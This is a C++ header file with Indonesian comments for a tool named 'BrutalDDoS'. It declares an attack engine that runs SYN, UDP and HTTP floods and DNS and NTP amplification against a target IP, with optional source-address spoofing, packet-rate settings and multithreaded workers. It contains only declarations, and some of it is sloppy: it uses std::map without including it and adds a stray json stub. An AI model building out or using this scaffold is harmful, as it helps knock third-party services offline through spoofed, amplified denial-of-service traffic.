#ifndef BRUTAL_DDOS_ATTACK_ENGINE_H
#define BRUTAL_DDOS_ATTACK_ENGINE_H

#include <string>
#include <vector>
#include <memory>
#include <thread>
#include <atomic>
#include <mutex>
#include <functional>
#include <chrono>

// Forward declarations for dependencies to keep compilation fast and clean
namespace spdlog {
    class logger;
}

namespace json {
    // Using nlohmann::json style namespace for clarity, 
    // assuming #include <nlohmann/json.hpp> is handled in implementation or precompiled header
    struct value_t {}; 
}

// Include actual third-party headers if not pre-included elsewhere
#include <nlohmann/json.hpp>
#include <spdlog/spdlog.h>

// Local includes
#include "PacketGenerator.h"
#include "SocketManager.h"
#include "AsyncIO.h"
#include "HttpFlood.h"
#include "UdpFlood.h"
#include "SynFlood.h"
#include "DnsAmplification.h"
#include "NtpAmplification.h"
#include "ConfigParser.h"

namespace BrutalDDoS {

/**
 * @brief Enum untuk mode serangan yang didukung.
 */
enum class AttackMode {
    SYN_FLOOD,
    UDP_FLOOD,
    HTTP_GET,
    HTTP_POST,
    DNS_AMPLIFICATION,
    NTP_AMPLIFICATION,
    ALL // Mode gabungan untuk benchmarking atau stress test total
};

/**
 * @brief Struktur konfigurasi serangan dinamis.
 */
struct AttackConfig {
    std::string target_ip;
    uint16_t target_port = 80;
    AttackMode mode = AttackMode::ALL;
    
    // Parameter umum
    int thread_count = 16;
    bool verbose = false;
    
    // Parameter spesifik
    uint64_t syn_rate = 50000;      // packets per second
    uint64_t udp_bandwidth_mbps = 500; // Mbps
    uint64_t http_rps = 2000;       // Requests per second
    std::string http_method = "POST";
    size_t payload_size = 4096;     // bytes
    
    // Optional: Custom headers for HTTP
    std::map<std::string, std::string> custom_headers;
    
    // Optional: Source IP spoofing (if supported by OS/kernel)
    bool spoof_source = false;
    std::string source_ip_pattern = "random"; 
};

/**
 * @class AttackEngine
 * @brief Kelas utama orchestrator serangan.
 * 
 * Mengelola lifecycle serangan: inisialisasi thread, scheduling, load balancing antar socket,
 * dan graceful shutdown.
 */
class AttackEngine {
public:
    /**
     * @brief Konstruktor.
     * @param config Konfigurasi serangan.
     * @param packet_generator Shared pointer ke generator paket (singleton-like).
     * @param socket_manager Manager socket untuk reuse connection jika perlu.
     */
    AttackEngine(const AttackConfig& config, 
                 std::shared_ptr<PacketGenerator> packet_generator,
                 std::shared_ptr<SocketManager> socket_manager);

    ~AttackEngine();

    /**
     * @brief Memulai serangan sesuai mode yang dipilih.
     * @return true jika serangan berhasil dimulai, false jika gagal.
     */
    bool start();

    /**
     * @brief Menghentikan serangan dengan gracefull shutdown.
     * Menunggu semua thread selesai sebelum kembali.
     */
    void stop();

    /**
     * @brief Mendapatkan status statistik serangan.
     * @return String berisi ringkasan statistik.
     */
    std::string getStatusReport() const;

    /**
     * @brief Update konfigurasi runtime (misal: mengubah RPS saat serangan berjalan).
     * @param new_config Partial config yang ingin diupdate.
     */
    void updateConfig(const AttackConfig& new_config);

private:
    // Internal worker functions untuk setiap mode serangan
    void runSynFlood();
    void runUdpFlood();
    void runHttpGetFlood();
    void runHttpPostFlood();
    void runDnsAmplification();
    void runNtpAmplification();
    void runAllModes();

    // Utility internal
    void logStatus();
    void setupLogger();
    void cleanupThreads();

    // Data members
    AttackConfig config_;
    std::shared_ptr<PacketGenerator> packet_generator_;
    std::shared_ptr<SocketManager> socket_manager_;
    
    // Thread management
    std::vector<std::thread> worker_threads_;
    std::atomic<bool> running_{false};
    std::atomic<uint64_t> total_packets_sent_{0};
    std::atomic<uint64_t> errors_count_{0};
    
    // Mutex untuk logging dan status agar tidak race condition
    mutable std::mutex status_mutex_;
    
    // Logger instance
    std::shared_ptr<spdlog::logger> logger_;
    
    // Timing
    std::chrono::steady_clock::time_point start_time_;
};

} // namespace BrutalDDoS

#endif // BRUTAL_DDOS_ATTACK_ENGINE_H
